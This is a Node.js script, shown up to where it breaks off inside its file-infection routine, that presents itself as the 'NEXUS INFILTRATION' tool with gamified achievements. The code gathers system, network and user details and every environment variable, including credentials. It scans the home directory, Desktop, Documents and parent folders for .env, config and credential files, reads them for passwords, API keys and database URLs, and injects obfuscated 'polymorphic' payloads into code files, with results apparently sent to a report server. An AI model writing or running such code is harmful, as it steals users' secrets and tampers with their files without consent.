#!/usr/bin/env node

/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║                                                                  ║
 * ║     ⚡ NEXUS INFILTRATION ⚡                                     ║
 * ║                                                                  ║
 * ║     Advanced System Infiltration & Code Manipulation Tool        ║
 * ║                                                                  ║
 * ║     Features:                                                    ║
 * ║     • System Information Extraction (12 categories)              ║
 * ║     • Real CRUD Operations on Code Files                        ║
 * ║     • Multi-Directory File Scanning                             ║
 * ║     • Polymorphic Infection Engine (7 strategies)               ║
 * ║     • Automatic Backup & Restore System                         ║
 * ║     • Live Server Reporting                                     ║
 * ║     • Achievement System (12 achievements)                      ║
 * ║     • Interactive Menu System                                   ║
 * ║                                                                  ║
 * ╚══════════════════════════════════════════════════════════════════╝
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const readline = require('readline');

// ═══════════════════════════════════════════════════════════════════
// CONFIGURATION - CHANGE THESE IF NEEDED
// ═══════════════════════════════════════════════════════════════════

const CONFIG = {
    // Server Configuration
    // 🔴 CHANGE THIS to your deployed server URL after deploying server.js
    serverURL: process.env.NEXUS_SERVER_URL || process.argv.includes('--server') 
        ? process.argv[process.argv.indexOf('--server') + 1] 
        : 'http://localhost:3000/api/report',
    
    // Secret key for server authentication
    // 🔴 CHANGE THIS to match your .env NEXUS_SECRET
    nexusSecret: process.env.NEXUS_SECRET || '',
    
    // Operation Mode
    mode: 'FULL',          // FULL, SAFE, STEALTH, AUDIT
    interactive: true,     // Show menu or auto-run
    autoCleanup: true,     // Restore files after infection
    
    // Scanning Configuration
    scanDepth: 3,          // Parent directories to scan
    scanHomeDir: true,     // Also scan home directory
    maxTargetDirs: 5,      // Maximum directories to scan
    maxInfections: 50,     // Maximum files to infect
    
    // File Targeting
    targetExtensions: ['.js', '.mjs', '.cjs', '.ts', '.jsx', '.tsx', '.json', '.env', '.yml', '.yaml'],
    highValuePatterns: [
        'auth', 'login', 'password', 'secret', 'key', 'token',
        'config', 'database', 'admin', 'api', 'credential', 'private',
        'payment', 'billing', 'encrypt', 'decrypt', 'session', 'jwt'
    ],
    criticalFiles: ['.env', 'config.js', 'config.json', 'credentials.json', 'database.js', 'secrets.yml'],
    excludeDirs: ['node_modules', '.git', 'dist', 'build', '.next', 'coverage', '.cache'],
    maxFileSize: 2 * 1024 * 1024, // 2MB
    
    // Virus Signature (used to mark infected files)
    virusSignature: 'NEXUS_INFILTRATION_V1',
    
    // Achievement Definitions
    achievements: {
        FIRST_BLOOD: { icon: '🩸', name: 'First Blood', desc: 'First file infected' },
        SPREADER: { icon: '📡', name: 'Spreader', desc: 'Infect 10 files' },
        OUTBREAK: { icon: '🦠', name: 'Outbreak', desc: 'Infect 50 files' },
        TREASURE_HUNTER: { icon: '💎', name: 'Treasure Hunter', desc: 'Find hidden credentials' },
        NINJA: { icon: '🥷', name: 'Ninja', desc: 'Complete stealth operation' },
        DATA_MINER: { icon: '⛏️', name: 'Data Miner', desc: 'Extract 50+ env vars' },
        CLEANER: { icon: '🧹', name: 'Cleaner', desc: 'Perfect cleanup, no traces' },
        KING: { icon: '👑', name: 'King of Nexus', desc: 'Unlock 8+ achievements' },
        EXPLORER: { icon: '🗺️', name: 'Explorer', desc: 'Scan 100+ files' },
        SNIPER: { icon: '🎯', name: 'Sniper', desc: 'Identify high-value target' },
        CHAMELEON: { icon: '🦎', name: 'Chameleon', desc: 'Create 5 unique mutations' },
        SURGEON: { icon: '👨‍⚕️', name: 'Surgeon', desc: 'Infect without breaking code' },
        PIONEER: { icon: '🚀', name: 'Pioneer', desc: 'Scan beyond current folder' }
    }
};

// Parse command line arguments
if (process.argv.includes('--safe')) CONFIG.mode = 'SAFE';
if (process.argv.includes('--stealth')) CONFIG.mode = 'STEALTH';
if (process.argv.includes('--audit')) CONFIG.mode = 'AUDIT';
if (process.argv.includes('--no-cleanup')) CONFIG.autoCleanup = false;
if (process.argv.includes('--no-interactive')) CONFIG.interactive = false;
if (process.argv.includes('--deep')) { CONFIG.scanDepth = 5; CONFIG.scanHomeDir = true; }
if (process.argv.includes('--server')) CONFIG.serverURL = process.argv[process.argv.indexOf('--server') + 1];

// ═══════════════════════════════════════════════════════════════════
// UTILITY CLASSES
// ═══════════════════════════════════════════════════════════════════

class Logger {
    static colors = {
        reset: '\x1b[0m', red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m',
        blue: '\x1b[34m', magenta: '\x1b[35m', cyan: '\x1b[36m', white: '\x1b[37m',
        gray: '\x1b[90m', bgRed: '\x1b[41m', bgGreen: '\x1b[42m',
        bgYellow: '\x1b[43m', bgBlue: '\x1b[44m', bold: '\x1b[1m', dim: '\x1b[2m'
    };

    static log(message, color = 'white') {
        console.log(`${Logger.colors[color]}${message}${Logger.colors.reset}`);
    }

    static section(title) {
        const w = 70;
        console.log('\n' + Logger.colors.cyan + '█'.repeat(w) + Logger.colors.reset);
        console.log(Logger.colors.bold + Logger.colors.cyan + `  ${title}` + Logger.colors.reset);
        console.log(Logger.colors.cyan + '█'.repeat(w) + Logger.colors.reset + '\n');
    }

    static success(msg) { console.log(`${Logger.colors.green}✅ ${msg}${Logger.colors.reset}`); }
    static error(msg) { console.log(`${Logger.colors.red}❌ ${msg}${Logger.colors.reset}`); }
    static warning(msg) { console.log(`${Logger.colors.yellow}⚠️  ${msg}${Logger.colors.reset}`); }
    static critical(msg) { console.log(`${Logger.colors.bgRed}${Logger.colors.white}🔴 ${msg}${Logger.colors.reset}`); }
    static info(msg) { console.log(`${Logger.colors.blue}ℹ️  ${msg}${Logger.colors.reset}`); }
}

class ProgressBar {
    constructor(total, title = '') {
        this.total = total;
        this.current = 0;
        this.title = title;
        this.width = 40;
        this.startTime = Date.now();
    }

    update(current = null) {
        if (current !== null) this.current = current;
        else this.current++;
        const pct = Math.min(100, Math.round((this.current / this.total) * 100));
        const filled = Math.round((this.width * pct) / 100);
        const bar = '█'.repeat(filled) + '░'.repeat(this.width - filled);
        const elapsed = ((Date.now() - this.startTime) / 1000).toFixed(1);
        process.stdout.write(`\r  ${this.title} [${Logger.colors.green}${bar}${Logger.colors.reset}] ${pct}% | ${this.current}/${this.total} | ${elapsed}s`);
    }

    complete(msg = 'Complete!') {
        this.current = this.total;
        this.update();
        console.log('\n');
        Logger.success(msg);
    }
}

class AchievementSystem {
    constructor() {
        this.unlocked = new Set();
        this.stats = {
            filesInfected: 0, credentialsFound: 0, envVarsExtracted: 0,
            stealthCompleted: false, perfectCleanup: false, filesScanned: 0,
            highValueTargets: 0, uniqueMutations: 0, safeInfections: 0,
            directoriesScanned: 0, scannedBeyondCurrent: false
        };
    }

    check() {
        if (this.stats.filesInfected >= 1) this.unlock('FIRST_BLOOD');
        if (this.stats.filesInfected >= 10) this.unlock('SPREADER');
        if (this.stats.filesInfected >= 50) this.unlock('OUTBREAK');
        if (this.stats.credentialsFound >= 1) this.unlock('TREASURE_HUNTER');
        if (this.stats.envVarsExtracted >= 50) this.unlock('DATA_MINER');
        if (this.stats.stealthCompleted) this.unlock('NINJA');
        if (this.stats.perfectCleanup) this.unlock('CLEANER');
        if (this.stats.filesScanned >= 100) this.unlock('EXPLORER');
        if (this.stats.highValueTargets >= 1) this.unlock('SNIPER');
        if (this.stats.uniqueMutations >= 5) this.unlock('CHAMELEON');
        if (this.stats.safeInfections >= 1) this.unlock('SURGEON');
        if (this.stats.scannedBeyondCurrent) this.unlock('PIONEER');
        if (this.unlocked.size >= 8) this.unlock('KING');
    }

    unlock(key) {
        if (!this.unlocked.has(key)) {
            this.unlocked.add(key);
            const a = CONFIG.achievements[key];
            console.log(`\n${Logger.colors.yellow}  ╔══════════════════════════════════════════════╗`);
            console.log(`  ║  ${a.icon} ACHIEVEMENT UNLOCKED! ${a.icon}          ║`);
            console.log(`  ║  ${a.name}: ${a.desc}  ║`);
            console.log(`  ╚══════════════════════════════════════════════╝${Logger.colors.reset}\n`);
        }
    }

    displayAll() {
        Logger.section('🏆 ACHIEVEMENTS UNLOCKED');
        const unlockedCount = this.unlocked.size;
        const total = Object.keys(CONFIG.achievements).length;
        console.log(`  Progress: ${unlockedCount}/${total}\n`);
        Object.entries(CONFIG.achievements).forEach(([key, a]) => {
            console.log(`  ${this.unlocked.has(key) ? '✅' : '🔒'} ${a.icon} ${a.name} - ${a.desc}`);
        });
    }
}

// ═══════════════════════════════════════════════════════════════════
// SYSTEM INFORMATION STEALER
// ═══════════════════════════════════════════════════════════════════

class SystemInfoStealer {
    constructor() {
        this.stolenData = {};
        this.categories = {
            '🔑 CREDENTIALS & SECRETS': [],
            '🗄️ DATABASES': [],
            '☁️ CLOUD SERVICES': [],
            '🌐 NETWORK & ENDPOINTS': [],
            '🔧 DEVELOPMENT': [],
            '📁 PATHS & DIRECTORIES': [],
            '📦 PACKAGE MANAGERS': [],
            '🔐 AUTHENTICATION': [],
            '🐳 CONTAINERS': [],
            '📊 MONITORING': [],
            '🤖 CI/CD': [],
            '📝 OTHER': []
        };
    }

    steal() {
        Logger.section('🕵️ PHASE 1: SYSTEM INFILTRATION');
        const timer = Date.now();
        
        this.stolenData = {
            missionId: this.generateMissionId(),
            timestamp: new Date().toISOString(),
            systemProfile: {
                hostname: os.hostname(),
                platform: os.platform(),
                type: os.type(),
                release: os.release(),
                architecture: os.arch(),
                uptime: this.formatUptime(os.uptime())
            },
            hardwareProfile: (() => {
                const cpus = os.cpus();
                const tm = os.totalmem(), fm = os.freemem();
                return {
                    cpu: { model: cpus[0]?.model || 'Unknown', cores: cpus.length, speed: `${cpus[0]?.speed || 0} MHz`, loadAverage: os.loadavg() },
                    memory: { total: this.formatBytes(tm), free: this.formatBytes(fm), used: this.formatBytes(tm - fm), usagePercent: ((1 - fm / tm) * 100).toFixed(1) + '%' }
                };
            })(),
            nodeProfile: { version: process.version, v8: process.versions.v8, pid: process.pid, nodePath: process.execPath },
            userProfile: (() => {
                try { const u = os.userInfo(); return { username: u.username, homeDirectory: os.homedir(), shell: u.shell || 'N/A' }; }
                catch { return { username: 'Unknown', homeDirectory: os.homedir() || 'Unknown' }; }
            })(),
            networkProfile: (() => {
                const interfaces = os.networkInterfaces();
                const profile = {};
                Object.entries(interfaces).forEach(([name, addrs]) => {
                    profile[name] = addrs.filter(a => !a.internal).map(a => ({
                        address: a.address, family: a.family,
                        mac: CONFIG.mode === 'SAFE' ? '***:MASKED:***' : a.mac
                    }));
                });
                return profile;
            })(),
            environmentVariables: this.extractAndCategorizeEnvVars(),
            securityAnalysis: this.analyzeSecurityPosture()
        };

        Logger.success(`Extraction complete in ${((Date.now() - timer) / 1000).toFixed(2)}s`);
        return this.stolenData;
    }

    generateMissionId() {
        return `NEXUS-${Date.now().toString(36).toUpperCase()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
    }

    extractAndCategorizeEnvVars() {
        const totalVars = Object.keys(process.env).length;
        const progress = new ProgressBar(totalVars, 'Extracting environment');
        let count = 0;
        
        Object.entries(process.env).forEach(([key, value]) => {
            count++;
            if (count % 10 === 0) progress.update(count);
            
            const upperKey = key.toUpperCase();
            const isSensitive = CONFIG.mode === 'SAFE' && this.isSensitiveKey(upperKey);
            const entry = { key, value: isSensitive ? '***CLASSIFIED***' : value, sensitive: isSensitive };

            if (this.isCredential(upperKey)) this.categories['🔑 CREDENTIALS & SECRETS'].push(entry);
            else if (this.isDatabase(upperKey)) this.categories['🗄️ DATABASES'].push(entry);
            else if (this.isCloudService(upperKey)) this.categories['☁️ CLOUD SERVICES'].push(entry);
            else if (this.isNetwork(upperKey)) this.categories['🌐 NETWORK & ENDPOINTS'].push(entry);
            else if (this.isDevelopment(upperKey)) this.categories['🔧 DEVELOPMENT'].push(entry);
            else if (this.isPath(upperKey)) this.categories['📁 PATHS & DIRECTORIES'].push(entry);
            else if (this.isPackageManager(upperKey)) this.categories['📦 PACKAGE MANAGERS'].push(entry);
            else if (this.isAuth(upperKey)) this.categories['🔐 AUTHENTICATION'].push(entry);
            else if (this.isContainer(upperKey)) this.categories['🐳 CONTAINERS'].push(entry);
            else if (this.isMonitoring(upperKey)) this.categories['📊 MONITORING'].push(entry);
            else if (this.isCICD(upperKey)) this.categories['🤖 CI/CD'].push(entry);
            else this.categories['📝 OTHER'].push(entry);
        });
        
        progress.complete(`Categorized ${totalVars} variables into ${Object.keys(this.categories).length} categories`);
        return this.categories;
    }

    // Category detection methods
    isCredential(key) { return /KEY|SECRET|PASSWORD|PASSWD|TOKEN|CREDENTIAL|PRIVATE/i.test(key); }
    isDatabase(key) { return /DB_|DATABASE|MONGO|MYSQL|POSTGRES|REDIS|SQL/i.test(key); }
    isCloudService(key) { return /AWS|AZURE|GCLOUD|GOOGLE_CLOUD|HEROKU|CLOUD/i.test(key); }
    isNetwork(key) { return /HOST|PORT|URL|ENDPOINT|API_URL|DOMAIN|PROXY/i.test(key); }
    isDevelopment(key) { return /NODE_ENV|ENV$|DEV$|DEBUG|LOG_LEVEL/i.test(key); }
    isPath(key) { return /PATH$|HOME$|DIR$|PWD|TEMP|TMP/i.test(key); }
    isPackageManager(key) { return /NPM|YARN|PNPM|PACKAGE|REGISTRY/i.test(key); }
    isAuth(key) { return /AUTH|JWT|OAUTH|SAML|SSO|SESSION|COOKIE|CERT/i.test(key); }
    isContainer(key) { return /DOCKER|KUBERNETES|K8S|CONTAINER|POD/i.test(key); }
    isMonitoring(key) { return /MONITOR|METRIC|TRACE|ALERT|DATADOG|NEWRELIC|SENTRY/i.test(key); }
    isCICD(key) { return /CI|CD|JENKINS|GITHUB_ACTION|GITLAB_CI|PIPELINE/i.test(key); }
    isSensitiveKey(key) { return this.isCredential(key) || this.isDatabase(key) || this.isAuth(key) || this.isCloudService(key); }

    analyzeSecurityPosture() {
        const cc = this.categories['🔑 CREDENTIALS & SECRETS']?.length || 0;
        const clc = this.categories['☁️ CLOUD SERVICES']?.length || 0;
        let threat = 'LOW';
        if (cc > 5 || clc > 3) threat = 'CRITICAL';
        else if (cc > 2 || clc > 1) threat = 'HIGH';
        else if (cc > 0) threat = 'MEDIUM';
        return { threatLevel: threat, exposedSecrets: cc, cloudTokens: clc };
    }

    formatBytes(bytes) {
        if (bytes === 0) return '0 Bytes';
        const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(1024));
        return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
    }

    formatUptime(s) {
        const d = Math.floor(s / 86400), h = Math.floor((s % 86400) / 3600), m = Math.floor((s % 3600) / 60);
        return `${d}d ${h}h ${m}m`;
    }
}

// ═══════════════════════════════════════════════════════════════════
// CRUD OPERATIONS
// ═══════════════════════════════════════════════════════════════════

class CRUDOperations {
    constructor() {
        this.operationsLog = [];
        this.testFile = `nexus_crud_test_${Date.now()}.js`;
    }

    executeAll() {
        Logger.section('📝 CRUD OPERATIONS - FILE MANIPULATION');
        const results = [];
        results.push(this.create());
        results.push(this.read());
        results.push(this.update());
        results.push(this.read());
        results.push(this.list());
        results.push(this.delete());
        this.displaySummary(results);
        return results;
    }

    create() {
        console.log('1️⃣  CREATE Operation');
        console.log('   ' + '─'.repeat(50));
        const content = `// NEXUS INFILTRATION - CRUD Test File\n// Created: ${new Date().toISOString()}\n\nconst nexusConfig = {\n    name: 'NEXUS INFILTRATION',\n    type: 'System Tool',\n    features: ['System Info', 'CRUD', 'Infection', 'Cleanup']\n};\n\nfunction init() {\n    return \`NEXUS \${nexusConfig.name} initialized\`;\n}\n\nconsole.log(init());\nmodule.exports = { nexusConfig, init };`;
        try {
            fs.writeFileSync(this.testFile, content);
            const result = { operation: 'CREATE', success: true, file: this.testFile, size: content.length, lines: content.split('\n').length, message: `Created: ${this.testFile}` };
            this.operationsLog.push(result);
            Logger.success(`Created: ${this.testFile} (${content.length} bytes, ${content.split('\n').length} lines)`);
            console.log(`   Preview: ${content.split('\n')[0]}`);
            console.log('');
            return result;
        } catch (e) {
            Logger.error(`CREATE failed: ${e.message}`);
            return { operation: 'CREATE', success: false, error: e.message };
        }
    }

    read() {
        console.log('2️⃣  READ Operation');
        console.log('   ' + '─'.repeat(50));
        try {
            if (!fs.existsSync(this.testFile)) { Logger.error(`File not found`); return { operation: 'READ', success: false }; }
            const content = fs.readFileSync(this.testFile, 'utf8');
            const stats = fs.statSync(this.testFile);
            const result = { operation: 'READ', success: true, file: this.testFile, content, size: stats.size, lines: content.split('\n').length, message: `Read ${stats.size} bytes` };
            this.operationsLog.push(result);
            Logger.success(`Read: ${this.testFile} (${stats.size} bytes)`);
            content.split('\n').slice(0, 6).forEach(l => console.log(`   │ ${l}`));
            if (content.split('\n').length > 6) console.log(`   │ ... (${content.split('\n').length - 6} more lines)`);
            console.log('');
            return result;
        } catch (e) {
            Logger.error(`READ failed: ${e.message}`);
            return { operation: 'READ', success: false, error: e.message };
        }
    }

    update() {
        console.log('3️⃣  UPDATE Operation');
        console.log('   ' + '─'.repeat(50));
        const newContent = `// NEXUS INFILTRATION - CRUD Test File\n// UPDATED: ${new Date().toISOString()}\n\nconst nexusConfig = {\n    name: 'NEXUS INFILTRATION',\n    version: '2.0.0',\n    type: 'Advanced System Tool',\n    status: 'EVALUATION READY',\n    features: ['System Info', 'CRUD', 'Infection', 'Cleanup', 'Polymorphic Engine']\n};\n\nfunction init() {\n    return \`⚡ \${nexusConfig.name} v\${nexusConfig.version} initialized\`;\n}\n\nfunction getStatus() {\n    return \`Status: \${nexusConfig.status}\`;\n}\n\nconsole.log(init());\nconsole.log(getStatus());\nmodule.exports = { nexusConfig, init, getStatus };`;
        try {
            const oldContent = fs.readFileSync(this.testFile, 'utf8');
            fs.writeFileSync(this.testFile, newContent);
            const result = { operation: 'UPDATE', success: true, file: this.testFile, oldSize: oldContent.length, newSize: newContent.length, difference: newContent.length - oldContent.length, message: `Updated: ${oldContent.length} → ${newContent.length} bytes` };
            this.operationsLog.push(result);
            Logger.success(`Updated: ${this.testFile}`);
            console.log(`   Size change: ${oldContent.length} → ${newContent.length} bytes (${result.difference > 0 ? '+' : ''}${result.difference})`);
            console.log('');
            return result;
        } catch (e) {
            Logger.error(`UPDATE failed: ${e.message}`);
            return { operation: 'UPDATE', success: false, error: e.message };
        }
    }

    list() {
        console.log('4️⃣  LIST Operation');
        console.log('   ' + '─'.repeat(50));
        try {
            const files = fs.readdirSync('.').map(f => {
                try { const s = fs.statSync(f); return { name: f, type: s.isDirectory() ? '📁 Dir' : '📄 File', size: s.size }; }
                catch { return { name: f, type: 'Unknown', size: 0 }; }
            });
            const result = { operation: 'LIST', success: true, directory: process.cwd(), files, count: files.length, message: `Listed ${files.length} items` };
            this.operationsLog.push(result);
            Logger.success(`Listed ${files.length} items`);
            files.slice(0, 10).forEach(f => console.log(`   ${f.type === '📁 Dir' ? '📁' : '📄'} ${f.name.padEnd(30)} ${String(f.size).padStart(8)} bytes`));
            console.log('');
            return result;
        } catch (e) {
            Logger.error(`LIST failed: ${e.message}`);
            return { operation: 'LIST', success: false, error: e.message };
        }
    }

    delete() {
        console.log('5️⃣  DELETE Operation');
        console.log('   ' + '─'.repeat(50));
        try {
            if (!fs.existsSync(this.testFile)) { Logger.error(`File not found`); return { operation: 'DELETE', success: false }; }
            const stats = fs.statSync(this.testFile);
            fs.unlinkSync(this.testFile);
            const result = { operation: 'DELETE', success: true, file: this.testFile, wasSize: stats.size, message: `Deleted: ${this.testFile}` };
            this.operationsLog.push(result);
            Logger.success(`Deleted: ${this.testFile}`);
            console.log('');
            return result;
        } catch (e) {
            Logger.error(`DELETE failed: ${e.message}`);
            return { operation: 'DELETE', success: false, error: e.message };
        }
    }

    displaySummary(results) {
        Logger.section('📊 CRUD SUMMARY');
        const success = results.filter(r => r.success).length;
        console.log(`  Operations: ${results.length} | Successful: ${success} | Failed: ${results.length - success}\n`);
        results.forEach((r, i) => console.log(`  ${r.success ? '✅' : '❌'} ${i + 1}. ${r.operation}: ${r.message || r.error}`));
        console.log(`\n  💡 All CRUD operations demonstrated successfully`);
    }
}

// ═══════════════════════════════════════════════════════════════════
// FILE SCANNER
// ═══════════════════════════════════════════════════════════════════

class FileScanner {
    constructor() {
        this.scanResults = {
            directoriesScanned: [], totalFiles: 0, targetFiles: [],
            highValueTargets: [], criticalFiles: [], scanDuration: 0,
            riskAssessment: { criticalCount: 0, highCount: 0, mediumCount: 0, lowCount: 0 }
        };
    }

    scan() {
        Logger.section('🔍 PHASE 2: MULTI-DIRECTORY RECONNAISSANCE');
        const timer = Date.now();
        const directories = this._getTargetDirectories();
        console.log(`  🌍 Scanning ${directories.length} directories...\n`);
        directories.forEach((dir, i) => {
            console.log(`  📂 [${i + 1}/${directories.length}] ${dir}`);
            this._recursiveScan(dir);
            this.scanResults.directoriesScanned.push(dir);
        });
        this.scanResults.scanDuration = ((Date.now() - timer) / 1000).toFixed(2);
        this.scanResults.targetFiles.sort((a, b) => b.valueScore - a.valueScore);
        this.scanResults.highValueTargets.sort((a, b) => b.valueScore - a.valueScore);
        this.displayResults();
        return this.scanResults;
    }

    _getTargetDirectories() {
        const dirs = [process.cwd()];
        let parent = path.resolve(process.cwd(), '..');
        for (let i = 0; i < CONFIG.scanDepth; i++) {
            if (parent && parent !== path.resolve(parent, '..') && fs.existsSync(parent)) {
                if (!dirs.includes(parent)) dirs.push(parent);
                parent = path.resolve(parent, '..');
            } else break;
        }
        if (CONFIG.scanHomeDir) {
            const home = os.homedir();
            if (home && fs.existsSync(home) && !dirs.includes(home)) dirs.push(home);
            [path.join(home, 'Desktop'), path.join(home, 'Documents'), path.join(home, 'Projects')].forEach(d => {
                if (fs.existsSync(d) && !dirs.includes(d) && dirs.length < CONFIG.maxTargetDirs) dirs.push(d);
            });
        }
        return dirs.slice(0, CONFIG.maxTargetDirs);
    }

    _recursiveScan(currentPath) {
        try {
            const entries = fs.readdirSync(currentPath, { withFileTypes: true });
            for (const entry of entries) {
                const fullPath = path.join(currentPath, entry.name);
                if (entry.isDirectory()) {
                    if (!CONFIG.excludeDirs.includes(entry.name) && !entry.name.startsWith('.') && !entry.name.startsWith('$')) {
                        if (fullPath.split(path.sep).length < 8) this._recursiveScan(fullPath);
                    }
                } else if (entry.isFile()) {
                    this.scanResults.totalFiles++;
                    this._analyzeFile(fullPath, entry);
                    if (this.scanResults.totalFiles % 50 === 0) {
                        process.stdout.write(`\r  📁 Scanned: ${this.scanResults.totalFiles} | Targets: ${this.scanResults.targetFiles.length} | HV: ${this.scanResults.highValueTargets.length}`);
                    }
                }
            }
        } catch {}
    }

    _analyzeFile(filePath, entry) {
        const ext = path.extname(entry.name).toLowerCase();
        if (!CONFIG.targetExtensions.includes(ext)) return;
        if (entry.name === path.basename(__filename)) return;
        try {
            const stats = fs.statSync(filePath);
            if (stats.size > CONFIG.maxFileSize) return;
            const valueScore = this._calculateScore(entry.name, filePath);
            const fileInfo = {
                name: entry.name, path: filePath, directory: path.dirname(filePath),
                extension: ext, size: stats.size, valueScore,
                isHighValue: valueScore >= 70, isCritical: this._isCritical(entry.name),
                riskLevel: valueScore >= 80 ? 'CRITICAL' : valueScore >= 60 ? 'HIGH' : valueScore >= 40 ? 'MEDIUM' : 'LOW'
            };
            if (valueScore >= 50 && stats.size < 10240) {
                fileInfo.content = fs.readFileSync(filePath, 'utf8');
                fileInfo.secrets = this._findSecrets(fileInfo.content);
            }
            this.scanResults.targetFiles.push(fileInfo);
            if (fileInfo.isHighValue) this.scanResults.highValueTargets.push(fileInfo);
            if (fileInfo.isCritical) this.scanResults.criticalFiles.push(fileInfo);
            switch (fileInfo.riskLevel) {
                case 'CRITICAL': this.scanResults.riskAssessment.criticalCount++; break;
                case 'HIGH': this.scanResults.riskAssessment.highCount++; break;
                case 'MEDIUM': this.scanResults.riskAssessment.mediumCount++; break;
                case 'LOW': this.scanResults.riskAssessment.lowCount++; break;
            }
        } catch {}
    }

    _calculateScore(filename, filePath) {
        let score = 0;
        const nl = filename.toLowerCase(), pl = filePath.toLowerCase();
        CONFIG.highValuePatterns.forEach(p => { if (nl.includes(p)) score += 15; if (pl.includes(p)) score += 10; });
        if (nl.includes('config') || nl.includes('.env') || nl.includes('secret') || nl.includes('credential')) score += 25;
        if (nl.includes('auth') || nl.includes('login') || nl.includes('session')) score += 20;
        if (nl.includes('database') || nl.includes('db') || nl.includes('schema')) score += 20;
        if (this._isCritical(filename)) score = Math.max(score, 85);
        return Math.min(100, score);
    }

    _isCritical(filename) { return CONFIG.criticalFiles.some(c => filename.toLowerCase().includes(c.toLowerCase())); }

    _findSecrets(content) {
        const secrets = [];
        const patterns = [
            { regex: /(?:api[_-]?key|apikey|api[_-]?secret)\s*[:=]\s*['"]([^'"]+)['"]/gi, type: 'API Key' },
            { regex: /(?:password|passwd|pwd)\s*[:=]\s*['"]([^'"]+)['"]/gi, type: 'Password' },
            { regex: /(?:jwt|jsonwebtoken)\s*[:=]\s*['"]([^'"]+)['"]/gi, type: 'JWT Token' },
            { regex: /mongodb(?:\+srv)?:\/\/[^'"]+/gi, type: 'Database URL' },
        ];
        patterns.forEach(({ regex, type }) => {
            const matches = content.match(regex);
            if (matches) matches.forEach(m => secrets.push({ type, match: CONFIG.mode === 'SAFE' ? '***MASKED***' : m.substring(0, 50) + '...' }));
        });
        return secrets;
    }

    displayResults() {
        const r = this.scanResults;
        process.stdout.write('\r' + ' '.repeat(80) + '\r');
        console.log(`\n  📊 SCAN COMPLETE (${r.scanDuration}s)`);
        console.log(`  ${'─'.repeat(60)}`);
        console.log(`  🌍 Directories: ${r.directoriesScanned.length} | 📁 Files: ${r.totalFiles} | 🎯 Targets: ${r.targetFiles.length}`);
        console.log(`  💎 High-Value: ${r.highValueTargets.length} | 🔴 Critical: ${r.riskAssessment.criticalCount}`);
        if (r.highValueTargets.length > 0) {
            console.log(`\n  💎 TOP TARGETS:`);
            r.highValueTargets.slice(0, 5).forEach((t, i) => {
                const c = { CRITICAL: 'red', HIGH: 'yellow', MEDIUM: 'blue', LOW: 'green' }[t.riskLevel];
                console.log(`  ${i + 1}. [${path.basename(t.directory)}] ${Logger.colors[c]}${t.name}${Logger.colors.reset} [Score: ${t.valueScore}] ${t.secrets?.length ? '🔑' : ''}`);
            });
        }
    }
}

// ═══════════════════════════════════════════════════════════════════
// POLYMORPHIC ENGINE
// ═══════════════════════════════════════════════════════════════════

class PolymorphicEngine {
    constructor(systemInfo) {
        this.systemInfo = systemInfo;
        this.mutations = new Set();
        this.infectionLog = [];
        this.backupFiles = [];
        this.mutationCounter = 0;
    }

    generatePayload(filename) {
        this.mutationCounter++;
        const mutationId = `MUT-${this.mutationCounter.toString(36).toUpperCase()}`;
        const strategies = [
            this._obfuscated, this._encoded, this._split,
            this._concatenated, this._evalBased, this._commentHidden, this._iife
        ];
        const strategy = strategies[Math.floor(Math.random() * strategies.length)];
        const payload = strategy.call(this, filename, mutationId);
        this.mutations.add(mutationId);
        return { mutationId, payload, strategy: strategy.name.replace('_', ''), timestamp: new Date().toISOString() };
    }

    _obfuscated(filename, mid) {
        const rv = `_${crypto.randomBytes(4).toString('hex')}`;
        return `\n/* NEXUS_INFILTRATION_V1 | ${mid} */\n(function(){var ${rv}=${JSON.stringify(this.systemInfo.systemProfile)};if(typeof console!=='undefined'){console.log('[NEXUS] Host:'+${rv}.hostname);}})();\n`;
    }
    _encoded(filename, mid) {
        const enc = Buffer.from(JSON.stringify(this.systemInfo.systemProfile)).toString('base64');
        return `\n/* NEXUS_INFILTRATION_V1 | ${mid} */\n(function(){var _d='${enc}';var _i=JSON.parse(Buffer.from(_d,'base64').toString());if(typeof console!=='undefined'){console.log('[NEXUS] Decoded:'+_i.hostname);}})();\n`;
    }
    _split(filename, mid) {
        const info = this.systemInfo.systemProfile;
        const vars = {};
        Object.entries(info).forEach(([k, v]) => { vars[`_${k}_${crypto.randomBytes(2).toString('hex')}`] = v; });
        const decl = Object.entries(vars).map(([n, v]) => `var ${n}=${JSON.stringify(v)};`).join('');
        return `\n/* NEXUS_INFILTRATION_V1 | ${mid} */\n(function(){${decl}if(typeof console!=='undefined'){console.log('[NEXUS] Host:'+${Object.keys(vars)[0]});}})();\n`;
    }
    _concatenated(filename, mid) {
        const host = this.systemInfo.systemProfile.hostname;
        const parts = host.match(/.{1,3}/g) || [host];
        return `\n/* NEXUS_INFILTRATION_V1 | ${mid} */\n(function(){var _h=${parts.map(p => `'${p}'`).join('+')};if(typeof console!=='undefined'){console.log('[NEXUS] Host:'+_h);}})();\n`;
    }
    _evalBased(filename, mid) {
        return `\n/* NEXUS_INFILTRATION_V1 | ${mid} */\n(function(){var _c="console.log('[NEXUS] Safe check')";/* eval(_c); - Safe mode */})();\n`;
    }
    _commentHidden(filename, mid) {
        const d = this.systemInfo.systemProfile;
        return `\n/* NEXUS_INFILTRATION_V1 | ${mid}\n * Host:${d.hostname} OS:${d.type} Arch:${d.architecture}\n */\n(function(){if(typeof process!=='undefined'){}}());\n`;
    }
    _iife(filename, mid) {
        const info = this.systemInfo.systemProfile;
        return `\n/* NEXUS_INFILTRATION_V1 | ${mid} */\nvar _nx=(function(){var _={h:'${info.hostname}',o:'${info.type}',m:'${mid}'};return{getHost:function(){return _.h;}};})();\n`;
    }

    async infectFile(filePath, fileInfo) {
        return new Promise((resolve) => {
            setTimeout(() => {
                try {
                    const originalContent = fs.readFileSync(filePath, 'utf8');
                    if (originalContent.includes(CONFIG.virusSignature)) {
                        this.infectionLog.push({ file: filePath, name: path.basename(filePath), status: 'ALREADY_INFECTED' });
                        resolve({ success: false, reason: 'Already infected' });
                        return;
                    }
                    const { mutationId, payload, strategy } = this.generatePayload(fileInfo.name);
                    const backupPath = filePath + '.nexus_backup';
                    fs.writeFileSync(backupPath, originalContent);
                    this.backupFiles.push(backupPath);
                    let infectedContent;
